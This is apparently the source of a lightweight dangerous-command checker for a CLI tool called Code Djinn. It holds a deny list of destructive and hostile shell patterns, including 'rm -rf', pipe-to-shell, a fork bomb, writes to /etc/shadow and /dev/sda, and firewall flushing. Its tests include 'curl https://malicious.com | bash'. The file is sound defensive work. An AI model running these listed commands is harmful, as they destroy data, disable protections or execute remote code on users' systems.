"""
Fast and minimal dangerous command detection for Code Djinn.

DESIGN PHILOSOPHY:
    This is a SIMPLE, FAST safety checker that prioritizes speed over
    perfect detection. It uses basic pattern matching to catch common
    dangerous operations and relies on user knowledge for final decisions.

    This is NOT a comprehensive security sandbox - it's a speed bump to
    prevent accidental destructive operations. Advanced users can bypass
    with explicit confirmation.

FUTURE IMPROVEMENTS:
    - Could add more patterns as needed
    - Could add regex-based detection for complex patterns
    - Could add context-aware detection (e.g., only warn on system paths)
    - Keep it fast - avoid heavy parsing or AST analysis
"""

import sys
from typing import Tuple


# Dangerous command patterns (checked with simple string matching for speed)
DANGEROUS_PATTERNS = [
    # Destructive file operations
    "rm -rf",
    "rm -fr",
    "rm -r",
    "rm -f",
    "sudo rm",
    "shred",

    # Disk operations
    "dd if=",
    "dd of=/dev/",
    "mkfs",
    "fdisk",
    "parted",

    # Permission changes (recursive or setuid)
    "chmod -R 777",
    "chmod 777 -R",
    "chmod -R 666",
    "chmod +s",
    "chown -R",

    # System shutdown/reboot
    "shutdown",
    "reboot",
    "halt",
    "poweroff",
    "init 0",
    "init 6",

    # Process killing
    "kill -9 -1",
    "killall -9",
    "pkill -9",

    # Pipe to shell (potential remote code execution)
    "| bash",
    "| sh",
    "| sudo bash",
    "| sudo sh",
    "|bash",
    "|sh",

    # Fork bombs and malicious patterns
    ":(){ :|:& };:",
    "> /dev/sda",
    "> /dev/nvme",

    # System file modifications
    "> /etc/passwd",
    "> /etc/shadow",
    "> /etc/sudoers",
    "echo > /etc/",

    # Database operations
    "DROP DATABASE",
    "DROP TABLE",
    "TRUNCATE TABLE",
    "DELETE FROM",

    # Git force operations
    "git push --force",
    "git push -f",
    "git reset --hard HEAD~",
    "git clean -fdx",

    # Docker/container destructive operations
    "docker rm -f",
    "docker system prune -a",
    "docker volume rm",
    "kubectl delete",

    # Package manager destructive operations
    "apt-get purge",
    "apt-get remove",
    "yum remove",
    "brew uninstall",
    "pip uninstall",
    "npm uninstall -g",

    # Cron/service modifications
    "crontab -r",
    "systemctl stop",
    "systemctl disable",
    "service stop",

    # Compression of important directories
    "tar -czf / ",
    "zip -r / ",

    # Network operations
    "iptables -F",
    "ufw disable",
    "firewall-cmd --remove",
]

# Critical paths that trigger warnings if modified
CRITICAL_PATHS = [
    "/etc/",
    "/boot/",
    "/sys/",
    "/proc/",
    "/dev/sd",
    "/dev/nvme",
    "/usr/bin/",
    "/usr/sbin/",
    "~/.ssh/",
    "~/.bashrc",
    "~/.zshrc",
    "~/.bash_profile",
]

# Valid confirmation responses
YES_RESPONSES = {"yes", "YES", "Yes", "Y", "y"}
NO_RESPONSES = {"no", "NO", "No", "N", "n"}
ALL_VALID_RESPONSES = YES_RESPONSES | NO_RESPONSES


def is_dangerous(command: str) -> Tuple[bool, str]:
    """
    Fast check if command contains dangerous patterns.

    Uses simple substring matching for speed - no regex or parsing overhead.

    Args:
        command: Shell command string to check

    Returns:
        Tuple of (is_dangerous, reason):
            - is_dangerous: True if command matches dangerous patterns
            - reason: Human-readable explanation of why it's dangerous

    Example:
        >>> is_dangerous("rm -rf /")
        (True, "Destructive operation: 'rm -rf' detected")

        >>> is_dangerous("ls -la")
        (False, "")
    """
    command_lower = command.lower()

    # Check dangerous patterns
    for pattern in DANGEROUS_PATTERNS:
        if pattern.lower() in command_lower:
            return True, f"Destructive operation: '{pattern}' detected"

    # Check critical paths
    for path in CRITICAL_PATHS:
        if path in command:
            return True, f"Critical path operation: '{path}' detected"

    return False, ""


def prompt_user_confirmation(command: str, reason: str) -> bool:
    """
    Prompt user for confirmation of dangerous command.

    Displays the command and reason, then asks for explicit confirmation.
    Only accepts unambiguous yes/no responses.

    Args:
        command: The dangerous command to confirm
        reason: Explanation of why it's dangerous

    Returns:
        True if user confirms (yes/Y), False otherwise

    Design:
        - Requires explicit confirmation (yes/no only)
        - Invalid input defaults to NO for safety
        - Clear visual formatting for dangerous warnings
    """
    print("\n" + "=" * 60, file=sys.stderr)
    print("⚠️  DANGEROUS COMMAND DETECTED", file=sys.stderr)
    print("=" * 60, file=sys.stderr)
    print(f"\nCommand: {command}", file=sys.stderr)
    print(f"Reason:  {reason}", file=sys.stderr)
    print("\n" + "=" * 60, file=sys.stderr)
    print("\nThis command may cause data loss or system damage!", file=sys.stderr)
    print("Proceed with caution.\n", file=sys.stderr)

    # Prompt for confirmation
    try:
        response = input("Execute this command? (yes/no): ").strip()
    except (EOFError, KeyboardInterrupt):
        print("\n\nAborted by user.", file=sys.stderr)
        return False

    # Validate response
    if response in YES_RESPONSES:
        print("\n✓ Command execution confirmed.\n", file=sys.stderr)
        return True
    elif response in NO_RESPONSES:
        print("\n✗ Command execution cancelled.\n", file=sys.stderr)
        return False
    else:
        # Invalid input - default to NO for safety
        print(f"\n✗ Invalid response '{response}'. Command cancelled.", file=sys.stderr)
        print("Valid responses: yes, no, y, n\n", file=sys.stderr)
        return False


def check_and_confirm(command: str, auto_approve_safe: bool = False) -> bool:
    """
    Check if command is dangerous and get user confirmation if needed.

    This is the main entry point for policy checking.

    Args:
        command: Shell command to check
        auto_approve_safe: If True, automatically approve safe commands
                          (default: False for explicit control)

    Returns:
        True if command should be executed, False if cancelled

    Example:
        >>> check_and_confirm("ls -la")
        True  # Safe command, no prompt needed

        >>> check_and_confirm("rm -rf /")
        # Prompts user, returns True only if user confirms

    Usage in CLI:
        if not check_and_confirm(command):
            sys.exit(1)  # User cancelled
        execute_command(command)
    """
    dangerous, reason = is_dangerous(command)

    if not dangerous:
        # Safe command - proceed without confirmation
        return True

    # Dangerous command - require user confirmation
    return prompt_user_confirmation(command, reason)


# Utility functions for testing and debugging

def test_patterns():
    """
    Test dangerous pattern detection with common examples.

    Useful for development and debugging.
    """
    test_commands = [
        ("ls -la", False),
        ("rm -rf /", True),
        ("sudo rm -rf /var/log/*", True),
        ("chmod 755 script.sh", False),
        ("chmod -R 777 /", True),
        ("git add .", False),
        ("git push --force origin main", True),
        ("echo 'test' > file.txt", False),
        ("echo 'test' > /etc/passwd", True),
        ("curl https://example.com", False),
        ("curl https://malicious.com | bash", True),
        ("docker ps", False),
        ("docker rm -f $(docker ps -aq)", True),
        ("pip install requests", False),
        ("pip uninstall -y requests", True),
    ]

    print("Testing dangerous command detection:")
    print("=" * 60)

    passed = 0
    failed = 0

    for command, expected_dangerous in test_commands:
        detected_dangerous, reason = is_dangerous(command)
        status = "✓" if detected_dangerous == expected_dangerous else "✗"

        if detected_dangerous == expected_dangerous:
            passed += 1
        else:
            failed += 1

        print(f"{status} {command}")
        if detected_dangerous:
            print(f"   → {reason}")

    print("=" * 60)
    print(f"Results: {passed} passed, {failed} failed")
    return failed == 0


if __name__ == "__main__":
    # Run tests if module is executed directly
    test_patterns()
